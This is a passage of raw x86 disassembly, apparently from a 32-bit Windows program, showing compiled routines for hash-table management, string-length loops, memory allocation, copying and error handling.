  40bb86:	pop    edi
  40bb87:	pop    esi
  40bb88:	pop    ebx
  40bb89:	je     0x40bbcb
  40bb8b:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb8e:	mov    eax,DWORD PTR [ecx]
  40bb90:	call   DWORD PTR [eax+0x18]
  40bb93:	mov    esp,ebp
  40bb95:	pop    ebp
  40bb96:	ret    
  40bb97:	push   0x0
  40bb99:	mov    edx,0x4010c0
  40bb9e:	mov    ecx,0x5e5
  40bba3:	call   0x407010
  40bba8:	mov    edx,DWORD PTR ds:0x40e644
  40bbae:	push   0x0
  40bbb0:	mov    ecx,0x5e1
  40bbb5:	call   0x407010
  40bbba:	push   0x0
  40bbbc:	mov    edx,0x4010c0
  40bbc1:	mov    ecx,0x5e5
  40bbc6:	call   0x407010
  40bbcb:	mov    edx,DWORD PTR ds:0x40e644
  40bbd1:	push   0x0
  40bbd3:	mov    ecx,0x5ea
  40bbd8:	call   0x407010
  40bbdd:	int3   
  40bbde:	int3   
  40bbdf:	int3   
  40bbe0:	push   esi
  40bbe1:	push   0x1
  40bbe3:	push   DWORD PTR ds:0x41f370
  40bbe9:	call   DWORD PTR ds:0x424424
  40bbef:	mov    esi,eax
  40bbf1:	add    esp,0x8
  40bbf4:	test   esi,esi
  40bbf6:	je     0x40bc2b
  40bbf8:	mov    eax,ds:0x41f368
  40bbfd:	xor    edx,edx
  40bbff:	mov    DWORD PTR ds:0x40eaec,esi
  40bc05:	test   eax,eax
  40bc07:	je     0x40bc29
  40bc09:	lea    esp,[esp+0x0]
  40bc10:	cmp    WORD PTR [eax],0x2
  40bc14:	je     0x40bc3c
  40bc16:	movzx  ecx,dx
  40bc19:	mov    BYTE PTR [ecx+esi*1],0x1
  40bc1d:	mov    WORD PTR [eax+0x2],dx
  40bc21:	mov    eax,DWORD PTR [eax+0x4]
  40bc24:	inc    edx
  40bc25:	test   eax,eax
  40bc27:	jne    0x40bc10
  40bc29:	pop    esi
  40bc2a:	ret    
  40bc2b:	push   0x0
  40bc2d:	mov    edx,0x4010c0
  40bc32:	mov    ecx,0x5e5
  40bc37:	call   0x407010
  40bc3c:	push   ecx
  40bc3d:	lea    edx,[eax+0xc]
  40bc40:	call   0x407290
  40bc45:	add    esp,0x4
  40bc48:	push   0x0
  40bc4a:	mov    edx,0x4010c0
  40bc4f:	mov    ecx,0x5e9
  40bc54:	call   0x407010
  40bc59:	int3   
  40bc5a:	int3   
  40bc5b:	int3   
  40bc5c:	int3   
  40bc5d:	int3   
  40bc5e:	int3   
  40bc5f:	int3   
  40bc60:	push   ebp
  40bc61:	mov    ebp,esp
  40bc63:	sub    esp,0x428
  40bc69:	mov    eax,ds:0x40e018
  40bc6e:	xor    eax,ebp
  40bc70:	mov    DWORD PTR [ebp-0x4],eax
  40bc73:	push   DWORD PTR ds:0x41f370
  40bc79:	mov    DWORD PTR [ebp-0x414],0x1
  40bc83:	push   0x4
  40bc85:	call   DWORD PTR ds:0x424424
  40bc8b:	add    esp,0x8
  40bc8e:	mov    DWORD PTR [ebp-0x418],eax
  40bc94:	test   eax,eax
  40bc96:	je     0x40bf26
  40bc9c:	push   ebx
  40bc9d:	mov    ebx,DWORD PTR ds:0x4242c0
  40bca3:	push   esi
  40bca4:	push   edi
  40bca5:	mov    edi,DWORD PTR ds:0x41f368
  40bcab:	xor    esi,esi
  40bcad:	mov    DWORD PTR [ebp-0x410],0x401bfc
  40bcb7:	mov    DWORD PTR [ebp-0x408],esi
  40bcbd:	mov    DWORD PTR [ebp-0x40c],esi
  40bcc3:	test   edi,edi
  40bcc5:	je     0x40bd74
  40bccb:	mov    eax,0xffff
  40bcd0:	cmp    WORD PTR [edi+0x2],ax
  40bcd4:	je     0x40bd69
  40bcda:	test   esi,esi
  40bcdc:	je     0x40bcf1
  40bcde:	mov    edi,edi
  40bce0:	push   esi
  40bce1:	mov    esi,DWORD PTR [esi]
  40bce3:	push   0x0
  40bce5:	push   DWORD PTR ds:0x40e648
  40bceb:	call   ebx
  40bced:	test   esi,esi
  40bcef:	jne    0x40bce0
  40bcf1:	mov    ecx,DWORD PTR [ebp-0x418]
  40bcf7:	mov    DWORD PTR [ebp-0x408],0x0
  40bd01:	mov    DWORD PTR [ebp-0x40c],0x0
  40bd0b:	movzx  eax,WORD PTR [edi+0x2]
  40bd0f:	lea    edx,[ebp-0x410]
  40bd15:	mov    DWORD PTR [ecx+eax*4],edi
  40bd18:	lea    ecx,[edi+0xc]
  40bd1b:	call   0x40c690
  40bd20:	mov    ecx,eax
  40bd22:	test   ecx,ecx
  40bd24:	je     0x40bf26
  40bd2a:	lea    edx,[ecx+0x1]
  40bd2d:	lea    ecx,[ecx+0x0]
  40bd30:	mov    al,BYTE PTR [ecx]
  40bd32:	inc    ecx
  40bd33:	test   al,al
  40bd35:	jne    0x40bd30
  40bd37:	mov    eax,DWORD PTR [ebp-0x414]
  40bd3d:	inc    eax
  40bd3e:	sub    ecx,edx
  40bd40:	add    ecx,eax
  40bd42:	mov    eax,DWORD PTR [edi+0x8]
  40bd45:	test   eax,eax
  40bd47:	je     0x40bd4d
  40bd49:	mov    eax,DWORD PTR [eax]
  40bd4b:	jmp    0x40bd4f
  40bd4d:	xor    eax,eax
  40bd4f:	mov    esi,DWORD PTR [ebp-0x408]
  40bd55:	lea    eax,[eax*4+0x2]
  40bd5c:	add    eax,ecx
  40bd5e:	mov    DWORD PTR [ebp-0x414],eax
  40bd64:	mov    eax,0xffff
  40bd69:	mov    edi,DWORD PTR [edi+0x4]
  40bd6c:	test   edi,edi
  40bd6e:	jne    0x40bcd0
  40bd74:	push   0x1
  40bd76:	push   DWORD PTR [ebp-0x414]
  40bd7c:	call   DWORD PTR ds:0x424424
  40bd82:	add    esp,0x8
  40bd85:	mov    DWORD PTR [ebp-0x424],eax
  40bd8b:	test   eax,eax
  40bd8d:	je     0x40bf37
  40bd93:	mov    edi,eax
  40bd95:	xor    eax,eax
  40bd97:	mov    DWORD PTR [ebp-0x41c],eax
  40bd9d:	cmp    DWORD PTR ds:0x41f370,eax
  40bda3:	jle    0x40be8f
  40bda9:	lea    esp,[esp+0x0]
  40bdb0:	mov    ecx,DWORD PTR [ebp-0x418]
  40bdb6:	mov    eax,DWORD PTR [ecx+eax*4]
  40bdb9:	mov    DWORD PTR [ebp-0x428],eax
  40bdbf:	test   eax,eax
  40bdc1:	je     0x40be8f
  40bdc7:	test   esi,esi
  40bdc9:	je     0x40bde7
  40bdcb:	jmp    0x40bdd0
  40bdcd:	lea    ecx,[ecx+0x0]
  40bdd0:	push   esi
  40bdd1:	mov    esi,DWORD PTR [esi]
  40bdd3:	push   0x0
  40bdd5:	push   DWORD PTR ds:0x40e648
  40bddb:	call   ebx
  40bddd:	test   esi,esi
  40bddf:	jne    0x40bdd0
  40bde1:	mov    eax,DWORD PTR [ebp-0x428]
  40bde7:	lea    ecx,[eax+0xc]
  40bdea:	lea    edx,[ebp-0x410]
  40bdf0:	mov    DWORD PTR [ebp-0x408],0x0
  40bdfa:	mov    DWORD PTR [ebp-0x40c],0x0
  40be04:	call   0x40c690
  40be09:	test   eax,eax
  40be0b:	je     0x40bf26
  40be11:	push   eax
  40be12:	mov    eax,DWORD PTR [ebp-0x424]
  40be18:	sub    eax,edi
  40be1a:	add    eax,DWORD PTR [ebp-0x414]
  40be20:	push   eax
  40be21:	push   edi
  40be22:	call   DWORD PTR ds:0x424420
  40be28:	mov    ecx,edi
  40be2a:	add    esp,0xc
  40be2d:	lea    edx,[ecx+0x1]
  40be30:	mov    al,BYTE PTR [ecx]
  40be32:	inc    ecx
  40be33:	test   al,al
  40be35:	jne    0x40be30
  40be37:	sub    ecx,edx
  40be39:	add    edi,ecx
  40be3b:	mov    ecx,DWORD PTR [ebp-0x428]
  40be41:	mov    eax,DWORD PTR [ecx+0x8]
  40be44:	test   eax,eax
  40be46:	je     0x40be4d
  40be48:	movzx  eax,WORD PTR [eax]
  40be4b:	jmp    0x40be4f
  40be4d:	xor    eax,eax
  40be4f:	movzx  esi,ax
  40be52:	mov    WORD PTR [edi+0x1],ax
  40be56:	mov    eax,DWORD PTR [ecx+0x8]
  40be59:	shl    esi,0x2
  40be5c:	push   esi
  40be5d:	add    eax,0x4
  40be60:	push   eax
  40be61:	add    edi,0x3
  40be64:	push   edi
  40be65:	call   0x40db6c
  40be6a:	mov    eax,DWORD PTR [ebp-0x41c]
  40be70:	inc    eax
  40be71:	add    esp,0xc
  40be74:	add    edi,esi
  40be76:	mov    DWORD PTR [ebp-0x41c],eax
  40be7c:	cmp    eax,DWORD PTR ds:0x41f370
  40be82:	jge    0x40be8f
  40be84:	mov    esi,DWORD PTR [ebp-0x408]
  40be8a:	jmp    0x40bdb0
  40be8f:	mov    BYTE PTR [edi],0x0
  40be92:	mov    ecx,DWORD PTR ds:0x40e42c
  40be98:	lea    edx,[ebp-0x420]
  40be9e:	mov    eax,DWORD PTR [ecx]
  40bea0:	push   edx
  40bea1:	push   0x401be0
  40bea6:	call   DWORD PTR [eax+0x60]
  40bea9:	test   eax,eax
  40beab:	je     0x40bf48
  40beb1:	mov    ecx,DWORD PTR [ebp-0x420]
  40beb7:	push   DWORD PTR [ebp-0x414]
  40bebd:	mov    esi,DWORD PTR [ebp-0x424]
  40bec3:	mov    eax,DWORD PTR [ecx]
  40bec5:	push   esi
  40bec6:	call   DWORD PTR [eax+0xc]
  40bec9:	test   eax,eax
  40becb:	je     0x40bf48
  40becd:	mov    ecx,DWORD PTR [ebp-0x420]
  40bed3:	mov    eax,DWORD PTR [ecx]
  40bed5:	call   DWORD PTR [eax+0x18]
  40bed8:	test   eax,eax
  40beda:	je     0x40bf48
  40bedc:	push   esi
  40bedd:	mov    esi,DWORD PTR ds:0x42441c
  40bee3:	call   esi
  40bee5:	push   DWORD PTR [ebp-0x418]
  40beeb:	call   esi
  40beed:	mov    esi,DWORD PTR [ebp-0x408]
  40bef3:	add    esp,0x8
  40bef6:	mov    DWORD PTR [ebp-0x410],0x401bfc
  40bf00:	test   esi,esi
  40bf02:	je     0x40bf15
  40bf04:	push   esi
  40bf05:	mov    esi,DWORD PTR [esi]
  40bf07:	push   0x0
  40bf09:	push   DWORD PTR ds:0x40e648
  40bf0f:	call   ebx
  40bf11:	test   esi,esi
  40bf13:	jne    0x40bf04
  40bf15:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf18:	pop    edi
  40bf19:	pop    esi
  40bf1a:	xor    ecx,ebp
  40bf1c:	pop    ebx
  40bf1d:	call   0x40d492
  40bf22:	mov    esp,ebp
  40bf24:	pop    ebp
  40bf25:	ret    
  40bf26:	push   0x0
  40bf28:	mov    edx,0x4010c0
  40bf2d:	mov    ecx,0x5e5
  40bf32:	call   0x407010
  40bf37:	push   0x0
  40bf39:	mov    edx,0x4010c0
  40bf3e:	mov    ecx,0x5e5
  40bf43:	call   0x407010
  40bf48:	mov    edx,DWORD PTR ds:0x40e644
  40bf4e:	push   0x0
  40bf50:	mov    ecx,0x5df
  40bf55:	call   0x407010
  40bf5a:	int3   
  40bf5b:	int3   
  40bf5c:	int3   
  40bf5d:	int3   
  40bf5e:	int3   
  40bf5f:	int3   
  40bf60:	push   ebp
  40bf61:	mov    ebp,esp
  40bf63:	and    esp,0xfffffff8
  40bf66:	push   ecx
  40bf67:	push   ebx
  40bf68:	push   esi
  40bf69:	push   edi
  40bf6a:	or     edi,0xffffffff
  40bf6d:	xor    ebx,ebx
  40bf6f:	mov    ecx,DWORD PTR ds:0x40e094
  40bf75:	mov    eax,ds:0x40e09c
  40bf7a:	lea    ebx,[ebx+0x0]
  40bf80:	test   ebx,ebx
  40bf82:	je     0x40bf90
  40bf84:	mov    ebx,DWORD PTR [ebx]
  40bf86:	test   ebx,ebx
  40bf88:	jne    0x40bf9c
  40bf8a:	lea    ebx,[ebx+0x0]
  40bf90:	inc    edi
  40bf91:	cmp    edi,eax
  40bf93:	jge    0x40bfbf
  40bf95:	mov    ebx,DWORD PTR [ecx+edi*4]
  40bf98:	test   ebx,ebx
  40bf9a:	je     0x40bf90
  40bf9c:	mov    esi,DWORD PTR [ebx+0x8]
  40bf9f:	movzx  edx,WORD PTR [esi+0x10]
  40bfa3:	cmp    edx,0x2
  40bfa6:	je     0x40bf80
  40bfa8:	test   dx,dx
  40bfab:	je     0x40bf80
  40bfad:	mov    ecx,esi
  40bfaf:	call   0x4039b0
  40bfb4:	mov    eax,0x2
  40bfb9:	mov    WORD PTR [esi+0x10],ax
  40bfbd:	jmp    0x40bf6f
  40bfbf:	pop    edi
  40bfc0:	pop    esi
  40bfc1:	pop    ebx
  40bfc2:	mov    esp,ebp
  40bfc4:	pop    ebp
  40bfc5:	ret    
  40bfc6:	int3   
  40bfc7:	int3   
  40bfc8:	int3   
  40bfc9:	int3   
  40bfca:	int3   
  40bfcb:	int3   
  40bfcc:	int3   
  40bfcd:	int3   
  40bfce:	int3   
  40bfcf:	int3   
  40bfd0:	push   ebp
  40bfd1:	mov    ebp,esp
  40bfd3:	sub    esp,0x654
  40bfd9:	mov    eax,ds:0x40e018
  40bfde:	xor    eax,ebp
  40bfe0:	mov    DWORD PTR [ebp-0x4],eax
  40bfe3:	push   ebx
  40bfe4:	mov    ebx,DWORD PTR ds:0x40e8d4
  40bfea:	push   esi
  40bfeb:	push   edi
  40bfec:	mov    edi,DWORD PTR ds:0x40e8dc
  40bff2:	mov    edx,0x40e8e0
  40bff7:	mov    ecx,ebx
  40bff9:	mov    DWORD PTR [ebp-0x650],ebx
  40bfff:	call   0x409e70
  40c004:	mov    esi,eax
  40c006:	lea    eax,[ebp-0x648]
  40c00c:	push   eax
  40c00d:	push   esi
  40c00e:	call   DWORD PTR ds:0x4244b0
  40c014:	add    esp,0x8
  40c017:	test   eax,eax
  40c019:	je     0x40c1d3
  40c01f:	mov    eax,ds:0x423290
  40c024:	test   al,0x1
  40c026:	jne    0x40c078
  40c028:	or     eax,0x1
  40c02b:	push   0x40dea0
  40c030:	mov    ds:0x423290,eax
  40c035:	mov    DWORD PTR ds:0x42329c,0x0
  40c03f:	mov    DWORD PTR ds:0x423294,0x0
  40c049:	mov    DWORD PTR ds:0x423298,0x0
  40c053:	mov    DWORD PTR ds:0x4232a0,0x0
  40c05d:	mov    DWORD PTR ds:0x4232a4,0x0
  40c067:	mov    WORD PTR ds:0x4232a8,0x101
  40c070:	call   0x40d582
  40c075:	add    esp,0x4
  40c078:	mov    edx,0x40e438
  40c07d:	mov    ecx,edi
  40c07f:	call   0x409e70
  40c084:	mov    esi,DWORD PTR ds:0x4243e8
  40c08a:	push   0x0
  40c08c:	push   0x0
  40c08e:	push   0x0
  40c090:	push   0x0
  40c092:	push   0x104
  40c097:	lea    ecx,[ebp-0x418]
  40c09d:	push   ecx
  40c09e:	push   0x3
  40c0a0:	lea    ecx,[ebp-0xc]
  40c0a3:	push   ecx
  40c0a4:	push   eax
  40c0a5:	call   esi
  40c0a7:	add    esp,0x24
  40c0aa:	lea    eax,[ebp-0x210]
  40c0b0:	push   0x100
  40c0b5:	push   eax
  40c0b6:	push   0x100
  40c0bb:	lea    eax,[ebp-0x618]
  40c0c1:	push   eax
  40c0c2:	push   0x0
  40c0c4:	push   0x0
  40c0c6:	push   0x0
  40c0c8:	push   0x0
  40c0ca:	push   ebx
  40c0cb:	call   esi
  40c0cd:	lea    edx,[ebp-0xc]
  40c0d0:	add    esp,0x24
  40c0d3:	lea    ecx,[edx+0x2]
  40c0d6:	mov    ax,WORD PTR [edx]
  40c0d9:	add    edx,0x2
  40c0dc:	test   ax,ax
  40c0df:	jne    0x40c0d6
  40c0e1:	sub    edx,ecx
  40c0e3:	lea    ecx,[ebp-0x418]
  40c0e9:	sar    edx,1
  40c0eb:	lea    esi,[ecx+0x2]
  40c0ee:	mov    edi,edi
  40c0f0:	mov    ax,WORD PTR [ecx]
  40c0f3:	add    ecx,0x2
  40c0f6:	test   ax,ax
  40c0f9:	jne    0x40c0f0
  40c0fb:	sub    ecx,esi
  40c0fd:	lea    esi,[ebp-0x618]
  40c103:	sar    ecx,1
  40c105:	lea    edi,[esi+0x2]
  40c108:	jmp    0x40c110
  40c10a:	lea    ebx,[ebx+0x0]
  40c110:	mov    ax,WORD PTR [esi]
  40c113:	add    esi,0x2
  40c116:	test   ax,ax
  40c119:	jne    0x40c110
  40c11b:	sub    esi,edi
  40c11d:	lea    edi,[ebp-0x210]
  40c123:	sar    esi,1
  40c125:	lea    ebx,[edi+0x2]
  40c128:	jmp    0x40c130
  40c12a:	lea    ebx,[ebx+0x0]
  40c130:	mov    ax,WORD PTR [edi]
  40c133:	add    edi,0x2
  40c136:	test   ax,ax
  40c139:	jne    0x40c130
  40c13b:	sub    edi,ebx
  40c13d:	sar    edi,1
  40c13f:	mov    DWORD PTR [ebp-0x64c],0x0
  40c149:	lea    eax,[edi+esi*1]
  40c14c:	add    eax,ecx
  40c14e:	lea    esi,[edx+0x1]
  40c151:	add    esi,eax
  40c153:	mov    ecx,0x104
  40c158:	cmp    esi,0x104
  40c15e:	jb     0x40c162
  40c160:	mov    ecx,esi
  40c162:	mov    eax,ds:0x423294
  40c167:	mov    ds:0x423298,eax
  40c16c:	lea    eax,[ebp-0x64c]
  40c172:	push   eax
  40c173:	lea    eax,[ecx+ecx*1]
  40c176:	push   eax
  40c177:	mov    ecx,0x423294
  40c17c:	call   0x406f80
  40c181:	test   eax,eax
  40c183:	je     0x40c1e6
  40c185:	lea    eax,[ebp-0x210]
  40c18b:	push   eax
  40c18c:	lea    eax,[ebp-0x618]
  40c192:	push   eax
  40c193:	lea    eax,[ebp-0x418]
  40c199:	push   eax
  40c19a:	lea    eax,[ebp-0xc]
  40c19d:	push   eax
  40c19e:	push   esi
  40c19f:	mov    esi,DWORD PTR [ebp-0x64c]
  40c1a5:	push   esi
  40c1a6:	call   DWORD PTR ds:0x4243ec
  40c1ac:	lea    eax,[ebp-0x648]
  40c1b2:	push   eax
  40c1b3:	push   esi
  40c1b4:	call   DWORD PTR ds:0x4244b0
  40c1ba:	add    esp,0x20
  40c1bd:	test   eax,eax
  40c1bf:	je     0x40c1d3
  40c1c1:	mov    ecx,DWORD PTR [ebp-0x650]
  40c1c7:	mov    edx,0x40e8e0
  40c1cc:	call   0x409e70
  40c1d1:	mov    esi,eax
  40c1d3:	mov    ecx,DWORD PTR [ebp-0x4]
  40c1d6:	pop    edi
  40c1d7:	mov    eax,esi
  40c1d9:	pop    esi
  40c1da:	xor    ecx,ebp
  40c1dc:	pop    ebx
  40c1dd:	call   0x40d492
  40c1e2:	mov    esp,ebp
  40c1e4:	pop    ebp
  40c1e5:	ret    
  40c1e6:	push   0x0
  40c1e8:	mov    edx,0x4010c0
  40c1ed:	mov    ecx,0x5e5
  40c1f2:	call   0x407010
  40c1f7:	int3   
  40c1f8:	int3   
  40c1f9:	int3   
  40c1fa:	int3   
  40c1fb:	int3   
  40c1fc:	int3   
  40c1fd:	int3   
  40c1fe:	int3   
  40c1ff:	int3   
  40c200:	push   ebp
  40c201:	mov    ebp,esp
  40c203:	push   ecx
  40c204:	mov    ecx,DWORD PTR [ebp+0x8]
  40c207:	call   0x40b0b0
  40c20c:	pop    ecx
  40c20d:	pop    ebp
  40c20e:	ret    
  40c20f:	int3   
  40c210:	push   esi
  40c211:	mov    esi,ecx
  40c213:	call   0x40c280
  40c218:	test   al,al
  40c21a:	jne    0x40c25e
  40c21c:	mov    eax,esi
  40c21e:	lea    edx,[eax+0x2]
  40c221:	mov    cx,WORD PTR [eax]
  40c224:	add    eax,0x2
  40c227:	test   cx,cx
  40c22a:	jne    0x40c221
  40c22c:	sub    eax,edx
  40c22e:	sar    eax,1
  40c230:	push   ebx
  40c231:	lea    ebx,[eax+0x1]
  40c234:	push   edi
  40c235:	lea    eax,[ebx+ebx*1]
  40c238:	push   0x1
  40c23a:	push   eax
  40c23b:	call   DWORD PTR ds:0x424424
  40c241:	mov    edi,eax
  40c243:	add    esp,0x8
  40c246:	test   edi,edi
  40c248:	je     0x40c260
  40c24a:	push   esi
  40c24b:	push   ebx
  40c24c:	push   edi
  40c24d:	call   DWORD PTR ds:0x4244b8
  40c253:	add    esp,0x8
  40c256:	push   edi
  40c257:	call   0x40c4e0
  40c25c:	pop    edi
  40c25d:	pop    ebx
  40c25e:	pop    esi
  40c25f:	ret    
  40c260:	push   0x0
  40c262:	mov    edx,0x4010c0
  40c267:	mov    ecx,0x5e5
  40c26c:	call   0x407010
  40c271:	int3   
  40c272:	int3   
  40c273:	int3   
  40c274:	int3   
  40c275:	int3   
  40c276:	int3   
  40c277:	int3   
  40c278:	int3   
  40c279:	int3   
  40c27a:	int3   
  40c27b:	int3   
  40c27c:	int3   
  40c27d:	int3   
  40c27e:	int3   
  40c27f:	int3   
  40c280:	push   ebp
  40c281:	mov    ebp,esp
  40c283:	and    esp,0xfffffff8
  40c286:	push   ecx
  40c287:	push   ebx
  40c288:	push   esi
  40c289:	push   edi
  40c28a:	mov    edi,ecx
  40c28c:	call   0x40b0b0
  40c291:	movzx  ebx,ax
  40c294:	and    ebx,0x8000007f
  40c29a:	jns    0x40c2a1
  40c29c:	dec    ebx
  40c29d:	or     ebx,0xffffff80
  40c2a0:	inc    ebx
  40c2a1:	xor    esi,esi
  40c2a3:	test   esi,esi
  40c2a5:	je     0x40c2ab
  40c2a7:	mov    esi,DWORD PTR [esi]
  40c2a9:	jmp    0x40c2b3
  40c2ab:	mov    eax,ds:0x40e0a4
  40c2b0:	mov    esi,DWORD PTR [eax+ebx*4]
  40c2b3:	test   esi,esi
  40c2b5:	je     0x40c30a
  40c2b7:	cmp    BYTE PTR ds:0x40e690,0x0
  40c2be:	mov    eax,DWORD PTR [esi+0x4]
  40c2c1:	je     0x40c2f2
  40c2c3:	mov    ecx,edi
  40c2c5:	mov    dx,WORD PTR [eax]
  40c2c8:	cmp    dx,WORD PTR [ecx]
  40c2cb:	jne    0x40c2eb
  40c2cd:	test   dx,dx
  40c2d0:	je     0x40c2e7
  40c2d2:	mov    dx,WORD PTR [eax+0x2]
  40c2d6:	cmp    dx,WORD PTR [ecx+0x2]
  40c2da:	jne    0x40c2eb
  40c2dc:	add    eax,0x4
  40c2df:	add    ecx,0x4
  40c2e2:	test   dx,dx
  40c2e5:	jne    0x40c2c5
  40c2e7:	xor    eax,eax
  40c2e9:	jmp    0x40c2fd
  40c2eb:	sbb    eax,eax
  40c2ed:	or     eax,0x1
  40c2f0:	jmp    0x40c2fd
  40c2f2:	push   edi
  40c2f3:	push   eax
  40c2f4:	call   DWORD PTR ds:0x4244bc
  40c2fa:	add    esp,0x8
  40c2fd:	test   eax,eax
  40c2ff:	jne    0x40c2a3
  40c301:	mov    al,0x1
  40c303:	pop    edi
  40c304:	pop    esi
  40c305:	pop    ebx
  40c306:	mov    esp,ebp
  40c308:	pop    ebp
  40c309:	ret    
  40c30a:	pop    edi
  40c30b:	pop    esi
  40c30c:	xor    al,al
  40c30e:	pop    ebx
  40c30f:	mov    esp,ebp
  40c311:	pop    ebp
  40c312:	ret    
  40c313:	int3   
  40c314:	int3   
  40c315:	int3   
  40c316:	int3   
  40c317:	int3   
  40c318:	int3   
  40c319:	int3   
  40c31a:	int3   
  40c31b:	int3   
  40c31c:	int3   
  40c31d:	int3   
  40c31e:	int3   
  40c31f:	int3   
  40c320:	mov    ecx,DWORD PTR ds:0x40e094
  40c326:	mov    DWORD PTR ds:0x40e098,0x0
  40c330:	test   ecx,ecx
  40c332:	je     0x40c381
  40c334:	push   esi
  40c335:	xor    esi,esi
  40c337:	cmp    DWORD PTR ds:0x40e09c,esi
  40c33d:	jle    0x40c380
  40c33f:	nop
  40c340:	mov    eax,DWORD PTR [ecx+esi*4]
  40c343:	test   eax,eax
  40c345:	je     0x40c368
  40c347:	mov    edx,DWORD PTR ds:0x41fba8
  40c34d:	lea    ecx,[ecx+0x0]
  40c350:	mov    ecx,DWORD PTR [eax]
  40c352:	mov    DWORD PTR [eax],edx
  40c354:	mov    edx,eax
  40c356:	mov    DWORD PTR ds:0x41fba8,edx
  40c35c:	mov    eax,ecx
  40c35e:	test   ecx,ecx
  40c360:	jne    0x40c350
  40c362:	mov    ecx,DWORD PTR ds:0x40e094
  40c368:	mov    DWORD PTR [ecx+esi*4],0x0
  40c36f:	inc    esi
  40c370:	cmp    esi,DWORD PTR ds:0x40e09c
  40c376:	jge    0x40c380
  40c378:	mov    ecx,DWORD PTR ds:0x40e094
  40c37e:	jmp    0x40c340
  40c380:	pop    esi
  40c381:	ret    
  40c382:	int3   
  40c383:	int3   
  40c384:	int3   
  40c385:	int3   
  40c386:	int3   
  40c387:	int3   
  40c388:	int3   
  40c389:	int3   
  40c38a:	int3   
  40c38b:	int3   
  40c38c:	int3   
  40c38d:	int3   
  40c38e:	int3   
  40c38f:	int3   
  40c390:	push   ebp
  40c391:	mov    ebp,esp
  40c393:	push   esi
  40c394:	mov    esi,DWORD PTR [ebp+0x8]
  40c397:	push   edi
  40c398:	push   esi
  40c399:	call   DWORD PTR ds:0x40e0a0
  40c39f:	movzx  eax,ax
  40c3a2:	cdq    
  40c3a3:	idiv   DWORD PTR ds:0x40e09c
  40c3a9:	mov    eax,ds:0x40e094
  40c3ae:	add    esp,0x4
  40c3b1:	lea    edi,[eax+edx*4]
  40c3b4:	mov    eax,DWORD PTR [edi]
  40c3b6:	test   eax,eax
  40c3b8:	je     0x40c3cb
  40c3ba:	lea    ebx,[ebx+0x0]
  40c3c0:	cmp    DWORD PTR [eax+0x4],esi
  40c3c3:	je     0x40c3e8
  40c3c5:	mov    eax,DWORD PTR [eax]
  40c3c7:	test   eax,eax
  40c3c9:	jne    0x40c3c0
  40c3cb:	mov    ecx,DWORD PTR ds:0x41fba8
  40c3d1:	test   ecx,ecx
  40c3d3:	je     0x40c3f9
  40c3d5:	mov    eax,DWORD PTR [ecx]
  40c3d7:	mov    ds:0x41fba8,eax
  40c3dc:	xor    eax,eax
  40c3de:	mov    DWORD PTR [ecx],eax
  40c3e0:	mov    DWORD PTR [ecx+0x4],eax
  40c3e3:	mov    DWORD PTR [ecx+0x8],eax
  40c3e6:	jmp    0x40c441
  40c3e8:	mov    ecx,DWORD PTR [ebp+0xc]
  40c3eb:	mov    DWORD PTR [eax+0x8],ecx
  40c3ee:	mov    eax,0x1
  40c3f3:	pop    edi
  40c3f4:	pop    esi
  40c3f5:	pop    ebp
  40c3f6:	ret    0x8
  40c3f9:	mov    eax,ds:0x422ba0
  40c3fe:	cmp    eax,0xc
  40c401:	jge    0x40c428
  40c403:	cmp    eax,0x4
  40c406:	jb     0x40c415
  40c408:	mov    ecx,DWORD PTR ds:0x422b9c
  40c40e:	mov    edx,eax
  40c410:	call   0x40ccb0
  40c415:	mov    ecx,0x200
  40c41a:	call   0x40c940
  40c41f:	mov    edx,eax
  40c421:	mov    eax,0x200
  40c426:	jmp    0x40c42e
  40c428:	mov    edx,DWORD PTR ds:0x422b9c
  40c42e:	sub    eax,0xc
  40c431:	mov    ecx,edx
  40c433:	add    edx,0xc
  40c436:	mov    ds:0x422ba0,eax
  40c43b:	mov    DWORD PTR ds:0x422b9c,edx
  40c441:	mov    eax,DWORD PTR [ebp+0xc]
  40c444:	mov    DWORD PTR [ecx+0x4],esi
  40c447:	mov    DWORD PTR [ecx+0x8],eax
  40c44a:	mov    eax,DWORD PTR [edi]
  40c44c:	mov    DWORD PTR [ecx],eax
  40c44e:	mov    DWORD PTR [edi],ecx
  40c450:	inc    DWORD PTR ds:0x40e098
  40c456:	pop    edi
  40c457:	mov    eax,0x1
  40c45c:	pop    esi
  40c45d:	pop    ebp
  40c45e:	ret    0x8
  40c461:	int3   
  40c462:	int3   
  40c463:	int3   
  40c464:	int3   
  40c465:	int3   
  40c466:	int3   
  40c467:	int3   
  40c468:	int3   
  40c469:	int3   
  40c46a:	int3   
  40c46b:	int3   
  40c46c:	int3   
  40c46d:	int3   
  40c46e:	int3   
  40c46f:	int3   
  40c470:	mov    ecx,DWORD PTR ds:0x40e0a4
  40c476:	mov    DWORD PTR ds:0x40e0a8,0x0
  40c480:	test   ecx,ecx
  40c482:	je     0x40c4d1
  40c484:	push   esi
  40c485:	xor    esi,esi
  40c487:	cmp    DWORD PTR ds:0x40e0ac,esi
  40c48d:	jle    0x40c4d0
  40c48f:	nop
  40c490:	mov    eax,DWORD PTR [ecx+esi*4]
  40c493:	test   eax,eax
  40c495:	je     0x40c4b8
  40c497:	mov    edx,DWORD PTR ds:0x421ba8
  40c49d:	lea    ecx,[ecx+0x0]
  40c4a0:	mov    ecx,DWORD PTR [eax]
  40c4a2:	mov    DWORD PTR [eax],edx
  40c4a4:	mov    edx,eax
  40c4a6:	mov    DWORD PTR ds:0x421ba8,edx
  40c4ac:	mov    eax,ecx
  40c4ae:	test   ecx,ecx
  40c4b0:	jne    0x40c4a0
  40c4b2:	mov    ecx,DWORD PTR ds:0x40e0a4
  40c4b8:	mov    DWORD PTR [ecx+esi*4],0x0
  40c4bf:	inc    esi
  40c4c0:	cmp    esi,DWORD PTR ds:0x40e0ac
  40c4c6:	jge    0x40c4d0
  40c4c8:	mov    ecx,DWORD PTR ds:0x40e0a4
  40c4ce:	jmp    0x40c490
  40c4d0:	pop    esi
  40c4d1:	ret    
  40c4d2:	int3   
  40c4d3:	int3   
  40c4d4:	int3   
  40c4d5:	int3   
  40c4d6:	int3   
  40c4d7:	int3   
  40c4d8:	int3   
  40c4d9:	int3   
  40c4da:	int3   
  40c4db:	int3   
  40c4dc:	int3   
  40c4dd:	int3   
  40c4de:	int3   
  40c4df:	int3   
  40c4e0:	push   ebp
  40c4e1:	mov    ebp,esp
  40c4e3:	push   esi
  40c4e4:	push   edi
  40c4e5:	mov    edi,DWORD PTR ds:0x421ba8
  40c4eb:	test   edi,edi
